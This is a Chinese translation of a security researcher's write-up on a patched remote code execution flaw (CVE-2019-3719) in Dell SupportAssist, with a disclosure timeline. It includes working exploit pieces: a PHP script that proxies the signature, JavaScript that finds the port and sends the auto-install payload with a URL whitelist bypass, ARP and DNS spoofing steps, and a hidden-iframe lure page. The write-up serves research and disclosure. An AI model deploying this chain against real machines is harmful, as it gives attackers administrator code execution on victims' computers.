@@ -1,0 +1,548 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+**![s0o391556844664.png](https://image.3001.net/images/20190506/1557118127_5ccfbcaf600c4.png!small)**
+**你用的电脑是什么品牌的？你有没有对你电脑系统中预装或自带软件的安全性产生过怀疑？当我们谈论远程代码执行漏洞（RCE）时，可能大多数人会认为它和操作系统漏洞相关，但是有没有人考虑到预装到电脑系统中的第三方软件这一攻击可能呢？本文讲述的就是纽约17岁安全研究者最近发现的，戴尔预装在其电脑上的软件工具Dell
+SupportAssist 的一个远程代码执行漏洞（RCE），利用该漏洞，可对同一网络环境中安装有Dell SupportAssist
+的目标系统实施RCE攻击。Dell SupportAssist 用于“主动检查系统硬件和软件运行状况”，并且“预装自带在大多数全新的戴尔电脑系统中”。**
+
+以下为作者的详细分析，比较繁琐，涉及请求分析、完整性检查分析、漏洞利用思路构造、ARP和DNS欺骗。具体利用请参考文末最后的 **漏洞利用及PoC部份。**
+
+## 漏洞发现
+
+去年9月，因为我用了将近7年的Macbook Pro已经快要罢工了，所以，我打算重新购买一台性价比高的笔记本电脑，最终我选择了戴尔的G3
+15。笔记本电脑入手之后，我把其中的1TB普通硬盘换成了固态硬盘，在安装完Windows系统后，我想从戴尔官网上更新驱动，这时我发现了一件有意思的事，当我访问戴尔的技术支持网站时，会跳出一个如下图的选项：
+
+![01.png](https://image.3001.net/images/20190506/1557117462_5ccfba1629327.png!small)
+
+其中有两种提示，一是告诉用户需要输入戴尔电脑设备的服务标签、产品序列号和型号等等信息，另外一种是直接选择“Detect PC”（探测电脑）自动识别。
+
+Detect PC？自动识别？哦，这有点意思，它如何来识别我的电脑？出于好奇，我就点击了“Detect PC”按钮，看看会发生什么。
+
+![02.png](https://image.3001.net/images/20190506/1557117496_5ccfba38debf3.png!small)点击之后，跳出来了一个SupportAssist程序的安装选项。尽管这是一个便利工具，但我还是有点点不放心，由于我当前系统是新装系统，代理商系统已经被我革除。但为了进一步对该应用进行分析，我还是决定装装试试。该程序声称安装完成之后，可以完全更新我的驱动并使电脑系统保持更新。
+
+SupportAssist程序安装很简单，勾选上述选框，点击下载安装就行。安装完成之后，SupportAssist会在后台创建并启动名为SupportAssistAgent和Dell
+Hardware
+Support的服务项。初略看来，这两个服务进程看似为.NET程序，很容易被逆向分析。安装完后，我就重新访问戴尔技术支持网站，看看它能探测到什么东东？果然，这次出现的是以下驱动探测选项（
+“Detect Drivers”） ：
+
+ ****
+****![03.png](https://image.3001.net/images/20190506/1557117524_5ccfba54e25eb.png!small)为了更好的分析，我开启了Chrome浏览器的网络分析工具Web
+Inspector，打开了其中的Network按钮进行监视，接着，我就点击了上述选项页面中的 “Detect Drivers” 按钮，看看会有什么情况：
+
+![04.png](https://image.3001.net/images/20190506/1557117547_5ccfba6b9145f.png!small)
+经分析发现，戴尔技术支持网站此时会向我本机请求一个由SupportAssistAgent服务开启的8884端口，另外，我本机经由一个REST
+API和向戴尔技术支持网站发起各种通信请求，而且，在戴尔网站的响应中也设置了只有<https://www.dell.com>网站标记的Access-Control-Allow-Origin访问控制策略。
+
+在我的浏览器端，SupportAssist客户端程序通过请求<https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken>，生成一个签名对各种命令进行验证。驱动探测完成后，点击网页中的驱动下载按钮，其请求消息有点奇怪。其请求消息头如下：
+
+    
+    
+    POST [http://127.0.0.1:8884/downloadservice/downloadmanualinstall?expires=expiretime&signature=signature](http://127.0.0.1:8884/downloadservice/downloadmanualinstall?expires=expiretime&signature=signature)
+    
+    Accept: application/json, text/javascript, */*; q=0.01
+    
+    Content-Type: application/json
+    
+    Origin: <https://www.dell.com>
+    
+    Referer: [https://www.dell.com/support/home/us/en/19/product-support/servicetag/xxxxx/drivers?showresult=true&files=1](https://www.dell.com/support/home/us/en/19/product-support/servicetag/xxxxx/drivers?showresult=true&files=1)
+    
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+
+请求消息内容如下：
+
+    
+    
+    {
+    
+        {
+    
+        "title":"Dell G3 3579 and 3779 System BIOS",
+    
+        "category":"BIOS",
+    
+        "name":"G3_3579_1.9.0.exe",
+    
+        "location":"[https://downloads.dell.com/FOLDER05519523M/1/G3_3579_1.9.0.exe?uid=29b17007-bead-4ab2-859e-29b6f1327ea1&fn=G3_3579_1.9.0.exe](https://downloads.dell.com/FOLDER05519523M/1/G3_3579_1.9.0.exe?uid=29b17007-bead-4ab2-859e-29b6f1327ea1&fn=G3_3579_1.9.0.exe)",
+    
+        "isSecure":false,
+    
+        "fileUniqueId":"acd94f47-7614-44de-baca-9ab6af08cf66",
+    
+        "run":false,
+    
+        "restricted":false,
+    
+        "fileId":"198393521",
+    
+        "fileSize":"13 MB",
+    
+        "checkedStatus":false,
+    
+        "fileStatus":-99,
+    
+        "driverId":"4WW45",
+    
+        "path":"",
+    
+        "dupInstallReturnCode":"",
+    
+        "cssClass":"inactive-step",
+    
+        "isReboot":true,
+    
+        "DiableInstallNow":true,
+    
+        "$$hashKey":"object:175"
+    
+        }
+    
+    }
+
+通过请求来看，戴尔Web客户端貌似可以直接请求我本机系统中的SupportAssistAgent服务，显示驱动程序的下载和手动安装选项（“download
+and manually install”），由于，我打算从SupportAssistAgent服务中入手进行分析，看看戴尔技术支持网站发出的一些具体命令。
+
+刚开始，Dell
+SupportAssist程序会通过8884、8883、8885或8886端口生成一个web服务进程（System.Net.HttpListener），其中的端口选择视开放而定，一般为8884端口。在某个请求中，位于HttpListenerServiceFacade线程中的ListenerCallback会调用方法ClientServiceHandler.ProcessRequest。
+
+ClientServiceHandler.ProcessRequest是web服务进程中的主要方法函数，主要用于执行一些完整性检查，如确保其接收到的请求来自我的电脑本机，诸如此类等等。在本文后续我们会继续讨论完整性检查的相关问题，但是，这里我们还是把重点放到寻找RCE漏洞之上。
+
+ClientServiceHandler.ProcessRequest其中的一个完整性检查就是，戴尔技术支持网站会查看由我电脑系统中Dell
+SupportAssist与其Web客户端的请求中，涉及的Referer标签是否为Dell官方所属网站，以此来确定该请求是由其Web客户端发起的，如下：
+
+    
+    
+    // Token: 0x060000A8 RID: 168 RVA: 0x00004EA0 File Offset: 0x000030A0
+    
+    public static bool ValidateDomain(Uri request, Uri urlReferrer)
+    
+    {
+    
+     return SecurityHelper.ValidateDomain(urlReferrer.Host.ToLower()) && (request.Host.ToLower().StartsWith("127.0.0.1") || request.Host.ToLower().StartsWith("localhost")) &&request.Scheme.ToLower().StartsWith("http") && urlReferrer.Scheme.ToLower().StartsWith("http");
+    
+    }
+    
+    // Token: 0x060000A9 RID: 169 RVA: 0x00004F24 File Offset: 0x00003124
+    
+    public static bool ValidateDomain(string domain)
+    
+    {
+    
+     return domain.EndsWith(".dell.com") || domain.EndsWith(".dell.ca") || domain.EndsWith(".dell.com.mx") || domain.EndsWith(".dell.com.br") || domain.EndsWith(".dell.com.pr") || domain.EndsWith(".dell.com.ar") || domain.EndsWith(".supportassist.com");
+    
+    }
+
+从以上请求调用来看，其安全检查并不完善，能让攻击者找到很多攻击面，就拿绕过Referer/Origin来说，我们有以下几种可选方法：
+
+> 1.从任何戴尔所属网站中找到XSS漏洞（当然，我需在支持SupportAssist的网站中来发现这种XSS漏洞）；
+>
+> 2.发现子域名劫持漏洞；
+>
+> 3.从本机程序中构造恶意请求；
+>
+> 4.生成一个随机子域名[random].dell.com，并利用DNS劫持受害者请求，以此用我们控制的服务器来对对其进行响应。
+
+最终，我选择了第4种方法（稍后我会做出解释）。经验证请求的Referer/Origin信息之后，我发现ClientServiceHandler.ProcessRequest会对相应的GET、POST和OPTIONS功能做出响应。
+
+为了对Dell
+SupportAssist进行了深入研究，我决定通过它与戴尔技术支持网站之间的不同类型请求进行了抓包分析，刚好我的电脑系统还存在一些待定更新，所以我就选择了浏览器工具对请求进行拦截。
+
+首先，戴尔技术支持网站会循环遍历上述提到的四个端口来探测本机系统中安装的SupportAssist，之后如果端口开放，则会连接“isalive”服务方法，比较有意思的是，其中的签名“Signature”和“Expires”
+参数传递过程有点意思，为此，我逆向了浏览器端涉及的JS脚本，发现了以下问题：
+
+1.首先，浏览器会向网站<https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken>发起请求，以获取一个token，也就是签名Signature。当然，戴尔还会分配一个“Expires
+token”，以限制签名的过期时间；
+
+2.接着，浏览器会向每一个服务端口发出类似以下的请求：
+
+    
+    
+    http://127.0.0.1:[SERVICEPORT]/clientservice/isalive/?expires=[EXPIRES]&signature=[SIGNATURE]
+
+之后，当相应端口开放并接收到请求后，本机的Dell SupportAssist客户端会做出以下响应：
+
+    
+    
+    {
+    
+     "isAlive": true,
+    
+     "clientVersion": "[CLIENT VERSION]",
+    
+     "requiredVersion": null,
+    
+     "success": true,
+    
+     "data": null,
+    
+     "localTime": [EPOCH TIME],
+    
+     "Exception": {
+    
+         "Code": null,
+    
+         "Message": null,
+    
+         "Type": null
+    
+     }
+    
+    }
+
+4.当浏览器接收到上述响应消息之后，它就与给定的开放端口建立联系，进行后续的连接通信。
+
+通过对不同类型的请求进行测试后，我发现值得注意的因素是可以通过“getsysteminfo”方法来获取到电脑本机中的各项硬件信息，甚至也可以通过XSS漏洞方式来读取这些信息。这算是一个安全问题，因为这样我可以对电脑系统做出全方位的画像和敏感信息收集。
+
+另外，我还通过JS脚本逆向分析发现了以下一些特别的方法请求：
+
+    
+    
+    clientservice_getdevicedrivers - Grabs available updates.
+    
+    diagnosticsservice_executetip - Takes a tip guid and provides it to the PC Doctor service (Dell Hardware Support).
+    
+    downloadservice_downloadfiles - Downloads a JSON array of files.
+    
+    clientservice_isalive - Used as a heartbeat and returns basic information about the agent.
+    
+    clientservice_getservicetag - Grabs the service tag.
+    
+    localclient_img - Connects to SignalR (Dell Hardware Support).
+    
+    diagnosticsservice_getsysteminfowithappcrashinfo - Grabs system information with crash dump information.
+    
+    clientservice_getclientsysteminfo - Grabs information about devices on system and system health information optionally.
+    
+    diagnosticsservice_startdiagnosisflow - Used to diagnose issues on system.
+    
+    downloadservice_downloadmanualinstall - Downloads a list of files but does not execute them.
+    
+    diagnosticsservice_getalertsandnotifications - Gets any alerts and notifications that are pending.
+    
+    diagnosticsservice_launchtool - Launches a diagnostic tool.
+    
+    diagnosticsservice_executesoftwarefixes - Runs remediation UI and executes a certain action.
+    
+    downloadservice_createiso - Download an ISO.
+    
+    clientservice_checkadminrights - Check if the Agent privileged.
+    
+    diagnosticsservice_performinstallation - Update SupportAssist.
+    
+    diagnosticsservice_rebootsystem - Reboot system.
+    
+    clientservice_getdevices - Grab system devices.
+    
+    downloadservice_dlmcommand - Check on the status of or cancel an ongoing download.
+    
+    diagnosticsservice_getsysteminfo - Call GetSystemInfo on PC Doctor (Dell Hardware Support).
+    
+    downloadservice_installmanual - Install a file previously downloaded using downloadservice_downloadmanualinstall.
+    
+    downloadservice_createbootableiso - Download bootable iso.
+    
+    diagnosticsservice_isalive - Heartbeat check.
+    
+    downloadservice_downloadandautoinstall - Downloads a list of files and executes them.
+    
+    clientservice_getscanresults - Gets driver scan results.
+    
+    downloadservice_restartsystem - Restarts the system.
+
+引起我注意的是downloadservice_downloadandautoinstall方法，它会从特定URL下载文件并执行，当用户需要安装某个驱动程序时，它就能派上用场，进行自动的下载和安装。
+
+1.在确定某些驱动程序需要更新后，戴尔技术支持网站的浏览器端会发起一个以下的POST请求：
+
+    
+    
+    http://127.0.0.1:[SERVICE PORT]/downloadservice/downloadandautoinstall?expires=[EXPIRES]&signature=[SIGNATURE]
+
+2.其请求消息体为以下的JSON格式：
+
+    
+    
+    {
+    
+     {
+    
+     "title":"DOWNLOAD TITLE",
+    
+     "category":"CATEGORY",
+    
+     "name":"FILENAME",
+    
+     "location":"FILE URL",
+    
+     "isSecure":false,
+    
+     "fileUniqueId":"RANDOMUUID",
+    
+     "run":true,
+    
+     "installOrder":2,
+    
+     "restricted":false,
+    
+     "fileStatus":-99,
+    
+     "driverId":"DRIVER ID",
+    
+     "dupInstallReturnCode":0,
+    
+     "cssClass":"inactive-step",
+    
+     "isReboot":false,
+    
+     "scanPNPId":"PNP ID",
+    
+     "$$hashKey":"object:210"
+    
+     }
+    
+    }
+
+3.在执行完前述的完整性校验之后，ClientServiceHandler.ProcessRequest方法会发送相关的参数和ServiceMethod，这些参数和方法是我们传递给ClientServiceHandler.HandlePost中的；
+
+4.在ClientServiceHandler.HandlePost中，它会把所有参数排列成一个数组，然后调用ServiceMethodHelper.CallServiceMethod；
+
+5.之后，ServiceMethodHelper.CallServiceMethod会实现一个调度功能，去调用ServiceMethod中给定的方法函数。在这里的驱动下载中，它是
+“downloadandautoinstall” 方法：
+
+    
+    
+    if (service_Method == "downloadservice_downloadandautoinstall")
+    
+    {
+    
+     string files5 = (arguments != null && arguments.Length != 0 && arguments[0] != null) ? arguments[0].ToString() : string.Empty;
+    
+     result = DownloadServiceLogic.DownloadAndAutoInstall(files5, false);
+    
+    } 
+
+以上方法会调用 DownloadServiceLogic.DownloadAutoInstall，并提供请求体中JSON Payload的相应文件下载；
+
+6.接着，DownloadServiceLogic.DownloadAutoInstall会作为DownloadServiceLogic._HandleJson方法的一个封装函数，执行异常处理等功能；
+
+7.DownloadServiceLogic._HandleJson会对包含文件下载的请求体JSON
+Payload进行反序列化，然后执行以下完整性校验检查：
+
+    
+    
+    foreach (File file in list)
+    
+    {
+    
+     bool flag2 = file.Location.ToLower().StartsWith("http://");
+    
+     if (flag2)
+    
+     {
+    
+         file.Location = file.Location.Replace("http://", "https://");
+    
+     }
+    
+     bool flag3 = file != null && !string.IsNullOrEmpty(file.Location) && !SecurityHelper.CheckDomain(file.Location);
+    
+     if (flag3)
+    
+     {
+    
+         DSDLogger.Instance.Error(DownloadServiceLogic.Logger, "InvalidFileException being thrown in _HandleJson method");
+    
+         throw new InvalidFileException();
+    
+     }
+    
+    }
+    
+    DownloadHandler.Instance.RegisterDownloadRequest(CreateIso, Bootable, Install, ManualInstall, list);
+
+以上完整性校验检查会对其中涉及的每个文件进行循环检查，例如会检查下载文件的URL，如果是http://就会用https://代替，也会检查其中的URL是否与戴尔下载列表匹配。如下：
+
+    
+    
+    public static bool CheckDomain(string fileLocation)
+    
+    {
+    
+     List<string> list = new List<string>
+    
+     {
+    
+      "ftp.dell.com",
+    
+      "downloads.dell.com",
+    
+      "ausgesd4f1.aus.amer.dell.com"
+    
+     };
+    
+     return list.Contains(new Uri(fileLocation.ToLower()).Host);
+    
+    } 
+
+最终，如果以上类似完整性检查都能通过，就会通过DownloadHandler.RegisterDownloadRequest和Dell
+SupportAssist建立下载关系，以本机管理员身份下载并执行相应驱动文件。基于以上信息，我们可以来尝试编写一个漏洞利用代码。
+
+## 漏洞利用及PoC
+
+首先我们需要构造的是执行对SupportAssist客户端的请求，假设我们在一个戴尔的子域名网站环境中，在本节中我们将来讨论如何做到这一点。在此我决定模仿浏览器并用javascript发起请求。
+
+一开始，需要找到服务端口，这里可以轮询上述的四个预定义端口，并向“/clientservice/isalive”执行请求。另外还需要提供一个签名，为此，可以执行一个针对“<https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken>”的请求。
+
+这样看起来可能还是不行，因为签名响应中涉及的访问控制策略“Access-Control-Allow-Origin”
+里明确提到要是“<https://www.dell.com>”相关网站，但是我们身处的子域名环境可能并不是https方式的，那怎么办呢？我们可以从我们自己控制的服务端中来执行请求！
+
+从 “getdsdtoken” URL中返回的签名适配所有设备系统，它是通用签名，为此我写了一段PHP脚本来抓取它：
+
+    
+    
+    <?php
+    
+    header('Access-Control-Allow-Origin: *');
+    
+    echo file_get_contents('<https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken>');
+    
+    ?> 
+
+上述脚本的访问控制策略中允许任意域来对它执行请求，之后，它返回了原始的请求戴尔网站的签名，相当于一个获取签名的代理，随后
+“getdsdtoken”URL会返回附带签名和过期时间的JSON信息，接着，我们可以使用JSON.parse针对抓取信息进行解析，把其中的签名放置到一个javascript对象中。
+
+现在，我们有了签名和其过期时间，就可以执行请求构造了，以下就是执行端口轮询的脚本，如果相应的端口处于开放状态，就把它填入server_port变量中去。如下：
+
+    
+    
+    function FindServer() {
+    
+     ports.forEach(function(port) {
+    
+      var is_alive_url = "<http://127.0.0.1:>" + port + "/clientservice/isalive/?expires=" + signatures.Expires + "&signature=" + signatures.IsaliveToken;
+    
+      var response = SendAsyncRequest(is_alive_url, function(){server_port = port;});
+    
+     });
+    
+    } 
+
+在发现服务端之后，我们可以发送我们的Payload，但这是最难的部份，在“downloadandautoinstall”
+执行我们的Payload之前，还有多个需要解决的问题。
+
+从最难的问题说起，Dell
+SupportAssist客户端中有一个内置的白名单，具体而言，其必须是“ftp.dell.com”、“downloads.dell.com”或
+“ausgesd4f1.aus.amer.dell.com”这种类型的，从这个点来说几乎无计可施，而且在dell相关网站也发现不了任何开放重定向漏洞。但是，我突然想到，可以用中间人攻击（MITM）来看看。
+
+如果我们可以向Dell
+SupportAssist客户端提供一个类似http://的URL，那我们就能非常容易地拦截并修改其中的响应消息了！在某种程度上就能解决这个最难的问题了。
+
+另外一个问题看似是为了应对绕过第一个问题而设置的，结合前述分析，当文件下载URL是http://，则它会被https://代替，这是完整性检查中的相关方法定义：
+
+    
+    
+    file.Location = file.Location.Replace("http://", "https://");
+
+重点来了，按照上面的定义，也就是说，如果文件下载URL是"http://"样式的，那么就会被替换为"https://"，那要是文件下载URL是其它样式的，那意思是就不会被替换为"https://"了？为此，我们来试试，在"http://"中的左括号后加上一个空格，即：“<http://downloads.dell.com/abcdefg>”，这样一来，当执行完整性检查的时候，由于该文件下载URL是以“
+”空格开始的，所以，它的检查结果状态会返回false，但这也不影响后面部份的
+<http://downloads.dell.com/abcdefg>执行。为此，我编写了如下的JS自动请求发送脚本来实现这种URL绕过：
+
+    
+    
+    function SendRCEPayload() {
+    
+     var auto_install_url = "<http://127.0.0.1:>" + server_port + "/downloadservice/downloadandautoinstall?expires=" + signatures.Expires + "&signature=" + signatures.DownloadAndAutoInstallToken;
+    
+     var xmlhttp = new XMLHttpRequest();
+    
+     xmlhttp.open("POST", auto_install_url, true);
+    
+     var files = [];
+    
+     files.push({
+    
+     "title": "SupportAssist RCE",
+    
+     "category": "Serial ATA",
+    
+     "name": "calc.EXE",
+    
+     "location": " <http://downloads.dell.com/calc.EXE>", // those spaces are KEY
+    
+     "isSecure": false,
+    
+     "fileUniqueId": guid(),
+    
+     "run": true,
+    
+     "installOrder": 2,
+    
+     "restricted": false,
+    
+     "fileStatus": -99,
+    
+     "driverId": "FXGNY",
+    
+     "dupInstallReturnCode": 0,
+    
+     "cssClass": "inactive-step",
+    
+     "isReboot": false,
+    
+     "scanPNPId": "PCI\\VEN_8086&DEV_282A&SUBSYS_08851028&REV_10",
+    
+     "$$hashKey": "object:210"});
+    
+      xmlhttp.send(JSON.stringify(files)); 
+    
+    }
+
+有了这个Payload，现在就要想办法在同一网络中构造攻击端了，以下是我在PoC阶段有效的攻击端搭建步骤：
+
+1.在同一网络中获得特定网络接口下的某些IP地址；
+
+2.模拟戴尔Web服务端并提供一个包含路径的任意可执行程序，该程序文件对应于戴尔网站提供的驱动程序。模拟的Web服务端会检查请求主机头是否为downloads.dell.com，如果是则会发送可执行程序；如果请求中有dell.com域名，但是不是downloads下载域名，则它会发送上述的JS自动请求脚本。
+
+3.接下来，要对目标系统执行ARP欺骗，这里要开启IP转发才能把ARP包发送到目标系统，这样在路由和目标系统之间才能形成共识。我们会每隔几秒就重复发送这些ARP包，退出后，会把原始的MAC地址发送给目标系统和路由。
+
+4.最后，我们要使用iptables将DNS数据包重定向到网络过滤器队列来进行DNS欺骗，通过监听这个网络过滤器队列，并检查目标系统请求的域名是否是我们的目标网址（戴尔技术支持网站）。如果是，我们会发送一个假的域名系统数据包，表明我们是该网址的真正IP地址。
+
+5.当目标系统受害者访问我们的子域（直接通过网址或通过iframe间接访问）时，我们会向它发送恶意的JS脚本，由它来发现Dell
+SupportAssist客户端的服务端口，然后从我们之前创建的php文件中获取签名，最后发送RCE Payload。当Dell
+SupportAssist客户端处理RCE
+Payload时，它会向downloads.dell.com发出请求，这时我们结合以下的ARP和DNS欺骗效果，将会向目标系统返回一个任意的可执行程序。
+
+ **PoC漏洞利用视频如下** ：
+
+视频中的恶意dellrce.html源码为：
+
+    
+    
+    <h1>CVE-2019-3719</h1>
+    
+    <h1>Nothing suspicious here... move along...</h1>
+    
+    <iframe src="<http://www.dellrce.dell.com>" style="width: 0; height: 0; border: 0; border: none; position: absolute;"></iframe>
+
+具体的漏洞利用工具参见Github：<https://github.com/D4stiny/Dell-Support-Assist-RCE-PoC>
+
+## 漏洞上报进程
+
+> 2018.10.26 向Dell进行漏洞初报
+>
+> 2018.10.29 Dell给出回应，验证漏洞
+>
+> 2018.11.22 Dell验证漏洞
+>
+> 2018.11.29 Dell计划在2019年初给出暂时性修复补丁
+>
+> 2019.1.28 Dell告知漏洞公布延迟至3月
+>
+> 2019.3.13 Dell修复计划滞后，漏洞公布延期至4月
+>
+> 2019.4.18
+> Dell发出漏洞公告[CVE-2019-3718](https://www.dell.com/support/article/cn/zh/cndhs1/sln316857/dsa-2019-051-dell-> supportassist-client-%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E?lang=zh)
+>
+> 2019.4.30 我公开漏洞
+
+ ***参考来源：[d4stiny](https://d4stiny.github.io/Remote-Code-Execution-on-most-Dell-computers/)，clouds编译，转载请注明来自FreeBuf.COM**
+
